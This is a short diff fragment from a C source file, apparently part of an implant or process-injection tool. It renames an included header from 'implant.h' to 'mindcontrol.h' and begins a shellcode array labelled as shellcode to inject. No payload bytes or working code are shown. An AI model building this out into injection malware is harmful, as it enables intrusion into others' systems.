@@ -10,7 +10,7 @@
  
 */
 
-#include "implant.h"
+#include "mindcontrol.h"
 
 // True shellcode to inject using this method
 unsigned char payload[] = {
